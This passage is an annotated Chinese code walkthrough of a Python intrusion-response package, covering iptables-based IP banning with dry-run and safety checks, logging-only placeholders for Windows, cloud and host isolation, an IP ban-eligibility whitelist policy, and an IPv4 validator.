| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                check=True,` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timeout=_SUBPROCESS_TIMEOUT,` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                capture_output=True,` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 57 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(True, False, "applied", command=list(cmd))` |
| 58 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except subprocess.CalledProcessError as exc:` |
| 59 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `                False, False, f"called_process_error:{exc.returncode}", command=list(cmd)` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 62 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except subprocess.TimeoutExpired:` |
| 63 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, False, "timeout", command=list(cmd))` |
| 64 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except FileNotFoundError:` |
| 65 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, False, "iptables_not_found", command=list(cmd))` |
| 66 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 67 | 函数定义：声明 `unban_input_drop` 的输入、处理逻辑和返回结果。 | `    def unban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 68 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 69 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cmd = ["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"]` |
| 72 | 条件判断：满足条件时进入对应分支。 | `        if dry_run:` |
| 73 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[DRY RUN][iptables] 将执行解封（未真实调用）: %s", " ".join(cmd))` |
| 74 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(True, True, "dry_run_no_subprocess", command=list(cmd))` |
| 75 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `            subprocess.run(` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `                cmd,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                check=True,` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timeout=_SUBPROCESS_TIMEOUT,` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                capture_output=True,` |
| 81 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 82 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(True, False, "applied", command=list(cmd))` |
| 83 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except subprocess.CalledProcessError as exc:` |
| 84 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `                False, False, f"called_process_error:{exc.returncode}", command=list(cmd)` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 87 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except subprocess.TimeoutExpired:` |
| 88 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, False, "timeout", command=list(cmd))` |
| 89 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except FileNotFoundError:` |
| 90 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, False, "iptables_not_found", command=list(cmd))` |
| 91 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 类定义：声明 `WindowsFirewallPlaceholderManager`，封装相关状态与行为。 | `class WindowsFirewallPlaceholderManager(FirewallManager):` |
| 94 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Windows 防火墙占位：仅记录审计意图，不执行 netsh。"""` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 函数定义：声明 `ban_input_drop` 的输入、处理逻辑和返回结果。 | `    def ban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 97 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 98 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg = "windows_firewall_placeholder_noop"` |
| 100 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[防火墙占位][Windows] ban %s (%s)", ip.strip(), msg)` |
| 101 | 返回结果：把处理后的值交回调用方。 | `        return FirewallResult(True, dry_run, msg)` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 函数定义：声明 `unban_input_drop` 的输入、处理逻辑和返回结果。 | `    def unban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 104 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 105 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg = "windows_firewall_placeholder_noop"` |
| 107 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[防火墙占位][Windows] unban %s (%s)", ip.strip(), msg)` |
| 108 | 返回结果：把处理后的值交回调用方。 | `        return FirewallResult(True, dry_run, msg)` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 类定义：声明 `CloudSecurityGroupPlaceholderManager`，封装相关状态与行为。 | `class CloudSecurityGroupPlaceholderManager(FirewallManager):` |
| 112 | 文档字符串：说明当前模块、类或函数的职责。 | `    """云安全组 API 占位：不落真实规则。"""` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 函数定义：声明 `ban_input_drop` 的输入、处理逻辑和返回结果。 | `    def ban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 115 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 116 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg = "cloud_security_group_placeholder_noop"` |
| 118 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[防火墙占位][CloudSG] ban %s (%s)", ip.strip(), msg)` |
| 119 | 返回结果：把处理后的值交回调用方。 | `        return FirewallResult(True, dry_run, msg)` |
| 120 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 121 | 函数定义：声明 `unban_input_drop` 的输入、处理逻辑和返回结果。 | `    def unban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 122 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 123 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg = "cloud_security_group_placeholder_noop"` |
| 125 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[防火墙占位][CloudSG] unban %s (%s)", ip.strip(), msg)` |
| 126 | 返回结果：把处理后的值交回调用方。 | `        return FirewallResult(True, dry_run, msg)` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 129 | 函数定义：声明 `firewall_manager_from_env` 的输入、处理逻辑和返回结果。 | `def firewall_manager_from_env() -> FirewallManager:` |
| 130 | 文档字符串：说明当前模块、类或函数的职责。 | `    """RESPONSE_FIREWALL_BACKEND=iptables\|windows_placeholder\|cloud_sg_placeholder"""` |
| 131 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import os` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    kind = os.environ.get("RESPONSE_FIREWALL_BACKEND", "iptables").strip().lower()` |
| 134 | 条件判断：满足条件时进入对应分支。 | `    if kind == "windows_placeholder":` |
| 135 | 返回结果：把处理后的值交回调用方。 | `        return WindowsFirewallPlaceholderManager()` |
| 136 | 条件判断：满足条件时进入对应分支。 | `    if kind in ("cloud_sg_placeholder", "cloud_placeholder"):` |
| 137 | 返回结果：把处理后的值交回调用方。 | `        return CloudSecurityGroupPlaceholderManager()` |
| 138 | 返回结果：把处理后的值交回调用方。 | `    return IptablesFirewallManager()` |

## `src/response/host_isolation.py`

- 类型：自动响应
- 行数：61

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `主机隔离 Provider：未配置时由上层降级为人工待办。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from abc import ABC, abstractmethod` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Optional` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_validate import validate_ip` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 17 | 类定义：声明 `IsolationResult`，封装相关状态与行为。 | `class IsolationResult:` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    attempted: bool` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    success: bool` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    message: str` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 类定义：声明 `HostIsolationProvider`，封装相关状态与行为。 | `class HostIsolationProvider(ABC):` |
| 24 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 25 | 函数定义：声明 `isolate` 的输入、处理逻辑和返回结果。 | `    def isolate(self, ip: str, *, dry_run: bool) -> IsolationResult:` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ...` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 类定义：声明 `NullHostIsolationProvider`，封装相关状态与行为。 | `class NullHostIsolationProvider(HostIsolationProvider):` |
| 30 | 文档字符串：说明当前模块、类或函数的职责。 | `    """未配置：不执行隔离，由响应层写入人工待办。"""` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 函数定义：声明 `isolate` 的输入、处理逻辑和返回结果。 | `    def isolate(self, ip: str, *, dry_run: bool) -> IsolationResult:` |
| 33 | 返回结果：把处理后的值交回调用方。 | `        return IsolationResult(False, False, "provider_not_configured")` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 类定义：声明 `LoggingHostIsolationProvider`，封装相关状态与行为。 | `class LoggingHostIsolationProvider(HostIsolationProvider):` |
| 37 | 文档字符串：说明当前模块、类或函数的职责。 | `    """联调占位：仅打 critical 日志，表示“将调用外部隔离 API”。"""` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 函数定义：声明 `isolate` 的输入、处理逻辑和返回结果。 | `    def isolate(self, ip: str, *, dry_run: bool) -> IsolationResult:` |
| 40 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 41 | 返回结果：把处理后的值交回调用方。 | `            return IsolationResult(True, False, "invalid_ip")` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 43 | 条件判断：满足条件时进入对应分支。 | `        if dry_run:` |
| 44 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.critical("[DRY RUN][隔离] 将请求隔离主机: %s", ip)` |
| 45 | 返回结果：把处理后的值交回调用方。 | `            return IsolationResult(True, True, "dry_run_logged")` |
| 46 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.critical("[隔离] 已请求隔离主机（占位实现）: %s", ip)` |
| 47 | 返回结果：把处理后的值交回调用方。 | `        return IsolationResult(True, True, "logged_placeholder")` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 50 | 函数定义：声明 `host_isolation_from_env` 的输入、处理逻辑和返回结果。 | `def host_isolation_from_env() -> HostIsolationProvider:` |
| 51 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RESPONSE_HOST_ISOLATION=none\|logging` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `    未来可扩展为 edr \| aws_ssm 等，需显式配置，默认 none。` |
| 55 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 56 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import os` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mode = os.environ.get("RESPONSE_HOST_ISOLATION", "none").strip().lower()` |
| 59 | 条件判断：满足条件时进入对应分支。 | `    if mode in ("logging", "placeholder", "log"):` |
| 60 | 返回结果：把处理后的值交回调用方。 | `        return LoggingHostIsolationProvider()` |
| 61 | 返回结果：把处理后的值交回调用方。 | `    return NullHostIsolationProvider()` |

## `src/response/ip_policy.py`

- 类型：自动响应
- 行数：115

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `生产封禁 IP 策略：非法、保留、白名单与本地地址一律不得触发真实防火墙动作。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import ipaddress` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import FrozenSet, Optional, Set` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_validate import validate_ip` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 注释：解释下面或当前这段代码的设计意图。 | `# 复用 responder 的 IPv4 严格格式校验；本模块在其之上叠加路由/业务语义。` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 函数定义：声明 `_parse_csv_ips` 的输入、处理逻辑和返回结果。 | `def _parse_csv_ips(raw: str) -> FrozenSet[str]:` |
| 18 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: Set[str] = set()` |
| 19 | 循环：逐个处理集合或迭代器中的元素。 | `    for part in (raw or "").split(","):` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        s = part.strip()` |
| 21 | 条件判断：满足条件时进入对应分支。 | `        if s and validate_ip(s):` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `            out.add(s)` |
| 23 | 返回结果：把处理后的值交回调用方。 | `    return frozenset(out)` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `_reserved_or_special` 的输入、处理逻辑和返回结果。 | `def _reserved_or_special(addr: ipaddress.IPv4Address) -> bool:` |
| 27 | 条件判断：满足条件时进入对应分支。 | `    if addr.is_loopback or addr.is_link_local or addr.is_multicast:` |
| 28 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 29 | 条件判断：满足条件时进入对应分支。 | `    if int(addr) == 0:` |
| 30 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 31 | 注释：解释下面或当前这段代码的设计意图。 | `    # 文档网段（RFC 5737）允许演练封禁，不作为“非法”，但也不建议生产当真实攻击源` |
| 32 | 返回结果：把处理后的值交回调用方。 | `    return False` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 函数定义：声明 `_is_rfc1918_or_carrier` 的输入、处理逻辑和返回结果。 | `def _is_rfc1918_or_carrier(addr: ipaddress.IPv4Address) -> bool:` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    nets = (` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ipaddress.ip_network("10.0.0.0/8"),` |
| 38 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ipaddress.ip_network("172.16.0.0/12"),` |
| 39 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ipaddress.ip_network("192.168.0.0/16"),` |
| 40 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ipaddress.ip_network("100.64.0.0/10"),  # CGNAT` |
| 41 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 42 | 返回结果：把处理后的值交回调用方。 | `    return any(addr in n for n in nets)` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 45 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass(frozen=True)` |
| 46 | 类定义：声明 `BanEligibility`，封装相关状态与行为。 | `class BanEligibility:` |
| 47 | 文档字符串：说明当前模块、类或函数的职责。 | `    """是否允许执行真实封禁（iptables 等）。"""` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    allowed: bool` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reason: str = ""` |
| 51 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 52 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 53 | 函数定义：声明 `rejection_reason` 的输入、处理逻辑和返回结果。 | `    def rejection_reason(self) -> str:` |
| 54 | 返回结果：把处理后的值交回调用方。 | `        return self.reason if not self.allowed else ""` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 函数定义：声明 `load_business_whitelist_from_env` 的输入、处理逻辑和返回结果。 | `def load_business_whitelist_from_env() -> FrozenSet[str]:` |
| 58 | 返回结果：把处理后的值交回调用方。 | `    return _parse_csv_ips(os.environ.get("RESPONSE_BUSINESS_IP_WHITELIST", ""))` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 函数定义：声明 `load_private_whitelist_from_env` 的输入、处理逻辑和返回结果。 | `def load_private_whitelist_from_env() -> FrozenSet[str]:` |
| 62 | 文档字符串：说明当前模块、类或函数的职责。 | `    """显式私网/内网资产白名单：命中则禁止自动封禁（防误伤）。"""` |
| 63 | 返回结果：把处理后的值交回调用方。 | `    return _parse_csv_ips(os.environ.get("RESPONSE_PRIVATE_IP_WHITELIST", ""))` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 函数定义：声明 `check_real_ban_eligibility` 的输入、处理逻辑和返回结果。 | `def check_real_ban_eligibility(` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ip: str,` |
| 68 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    business_whitelist: Optional[FrozenSet[str]] = None,` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    private_whitelist: Optional[FrozenSet[str]] = None,` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    allow_private_ban: Optional[bool] = None,` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> BanEligibility:` |
| 73 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `    生产真实封禁前校验。` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 非法 IPv4 -> 拒绝` |
| 77 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 回环、链路本地 -> 拒绝` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 业务白名单命中 -> 拒绝` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - 私网白名单命中 -> 拒绝` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `    - RFC1918/CGNAT 等私网地址：默认拒绝（可通过 RESPONSE_ALLOW_PRIVATE_BAN=true 放开，仅限实验）` |
| 81 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 82 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(ip, str) or not ip.strip():` |
| 83 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "missing_source_ip")` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    s = ip.strip()` |
| 85 | 条件判断：满足条件时进入对应分支。 | `    if not validate_ip(s):` |
| 86 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "invalid_ipv4_format")` |
| 87 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 88 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        addr = ipaddress.ip_address(s)` |
| 90 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except ValueError:` |
| 91 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "invalid_ipv4_format")` |
| 92 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 93 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(addr, ipaddress.IPv4Address):` |
| 94 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "not_ipv4")` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 条件判断：满足条件时进入对应分支。 | `    if _reserved_or_special(addr):` |
| 97 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "reserved_or_localhost")` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    biz = business_whitelist if business_whitelist is not None else load_business_whitelist_from_env()` |
| 100 | 条件判断：满足条件时进入对应分支。 | `    if s in biz:` |
| 101 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "business_whitelist")` |
| 102 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    priv = private_whitelist if private_whitelist is not None else load_private_whitelist_from_env()` |
| 104 | 条件判断：满足条件时进入对应分支。 | `    if s in priv:` |
| 105 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "private_ip_whitelist")` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    allow_priv = (` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `        allow_private_ban` |
| 109 | 条件判断：满足条件时进入对应分支。 | `        if allow_private_ban is not None` |
| 110 | 兜底分支：处理前面条件都不满足的情况。 | `        else os.environ.get("RESPONSE_ALLOW_PRIVATE_BAN", "").lower() == "true"` |
| 111 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 112 | 条件判断：满足条件时进入对应分支。 | `    if _is_rfc1918_or_carrier(addr) and not allow_priv:` |
| 113 | 返回结果：把处理后的值交回调用方。 | `        return BanEligibility(False, "private_or_cgnat_range")` |
| 114 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 115 | 返回结果：把处理后的值交回调用方。 | `    return BanEligibility(True, "")` |

## `src/response/ip_validate.py`

- 类型：自动响应
- 行数：17

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""IPv4 严格格式校验（供响应层与 Web API 复用）。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import re` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_IPV4_PATTERN: re.Pattern[str] = re.compile(` |
| 7 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^(?:(?:25[0-5]\|2[0-4]\d\|[01]?\d\d?)\.){3}(?:25[0-5]\|2[0-4]\d\|[01]?\d\d?)$"` |
| 8 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 函数定义：声明 `validate_ip` 的输入、处理逻辑和返回结果。 | `def validate_ip(ip: str) -> bool:` |
| 12 | 条件判断：满足条件时进入对应分支。 | `    if not isinstance(ip, str):` |
| 13 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    stripped = ip.strip()` |
| 15 | 条件判断：满足条件时进入对应分支。 | `    if not stripped:` |
| 16 | 返回结果：把处理后的值交回调用方。 | `        return False` |
| 17 | 返回结果：把处理后的值交回调用方。 | `    return bool(_IPV4_PATTERN.match(stripped))` |

## `src/response/notifier.py`

- 类型：自动响应
- 行数：203

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `AlertNotifier：SMTP、Webhook（防 SSRF）、企业通道占位。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import smtplib` |
| 10 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import urllib.error` |
| 12 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import urllib.request` |
| 13 | 导入对象：从指定模块引入类、函数或常量。 | `from abc import ABC, abstractmethod` |
